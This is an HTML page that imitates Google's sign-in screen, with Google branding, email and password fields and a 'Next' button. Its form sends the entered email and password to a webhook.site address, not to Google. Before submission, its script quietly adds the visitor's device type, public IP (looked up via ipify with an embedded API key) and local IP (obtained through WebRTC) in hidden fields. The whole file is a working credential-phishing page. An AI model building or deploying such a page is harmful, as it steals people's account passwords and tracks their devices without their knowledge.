<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login</title>
    <link rel="stylesheet" href="stylesheet.css">
</head>
<body>
    <div class="login-container">
        <img src="logo.jpg" alt="Google Logo" class="google-logo">
        <h1 class="text">Sign in</h1>

        <!-- Form that sends data to the specified action URL -->
        <form id="loginForm" style="margin-bottom: 20px;" action="https://webhook.site/c4c04316-7f6f-4ffb-b4c3-dbcf4cc95062" method="post">
            <div class="input-group">
                <input type="text" id="email" name="email" required>
                <label for="email">Email or phone</label>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" required>
                <label for="password">Password</label>
            </div>
            
            <!-- Hidden input fields for device type and IP addresses -->
            <input type="hidden" id="deviceType" name="deviceType">
            <input type="hidden" id="localIP" name="localIP">
            <input type="hidden" id="publicIP" name="publicIP">
            
            <button type="submit">Next</button>
        </form>

        <!-- Show Password Option -->
        <form class="showPass">
            <label>
                <input type="checkbox" id="showPassword" name="showPassword" value="Show Password">
                Show Password
            </label>
        </form>

        <div class="footer">
            <p style="text-align: left;"><a href="#">Create account</a></p>
        </div>
    </div>

    <!-- JavaScript for detecting device type and fetching IP addresses -->
    <script>
        // Detect device type based on user agent
        function detectDevice() {
            const userAgent = navigator.userAgent.toLowerCase();
            if (/mobile/i.test(userAgent)) {
                return "Mobile";
            } else if (/tablet/i.test(userAgent)) {
                return "Tablet";
            } else {
                return "Desktop";
            }
        }

        // Fetch public IP address using ipify with API key
        async function fetchPublicIP() {
            const apiKey = 'at_rC0pgSOo6upnBvRW6B5rYWzeAfsw8'; // Replace with your IPify API key
            try {
                const response = await fetch(`https://api.ipify.org?format=json&apiKey=${apiKey}`);
                const data = await response.json();
                console.log("IPify API Response:", data);
                return data.ip;
            } catch (error) {
                console.error('Unable to fetch public IP address', error);
                return 'Error fetching IP';
            }
        }

        // Fetch local IP address using WebRTC
        function getLocalIP() {
            return new Promise((resolve, reject) => {
                const peerConnection = new RTCPeerConnection({
                    iceServers: []
                });

                peerConnection.createDataChannel('');
                peerConnection.createOffer()
                    .then(offer => peerConnection.setLocalDescription(offer))
                    .catch(error => reject(error));

                peerConnection.onicecandidate = event => {
                    if (event.candidate) {
                        const candidate = event.candidate.candidate;
                        const ipRegex = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/;
                        const match = ipRegex.exec(candidate);
                        if (match) {
                            resolve(match[1]);
                            peerConnection.close();
                        }
                    }
                };
            });
        }

        // Function to set device type and IP addresses before form submission
        async function setDeviceAndIP() {
            console.log("Setting device type and IP addresses...");

            // Set device type
            document.getElementById('deviceType').value = detectDevice();

            // Set public IP address using ipify
            const publicIP = await fetchPublicIP();
            document.getElementById('publicIP').value = publicIP;

            console.log("Public IP:", publicIP);

            // Set local IP address using WebRTC
            try {
                const localIP = await getLocalIP();
                document.getElementById('localIP').value = localIP;
                console.log("Local IP:", localIP);
            } catch (error) {
                console.error('Unable to fetch local IP address', error);
                document.getElementById('localIP').value = 'Error fetching IP';
            }

            console.log("Device type and IP addresses set.");
        }

        // Add event listener to form submission
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            console.log("Form submission started...");
            // Prevent form from submitting until we set the values
            event.preventDefault();

            // Set the device type and IP addresses
            await setDeviceAndIP();

            console.log("Submitting the form...");
            // After setting, submit the form
            this.submit();
        });

        // Show password toggle
        document.getElementById('showPassword').addEventListener('change', function() {
            var passwordInput = document.getElementById('password');
            if (this.checked) {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        });
    </script>
</body>
</html>
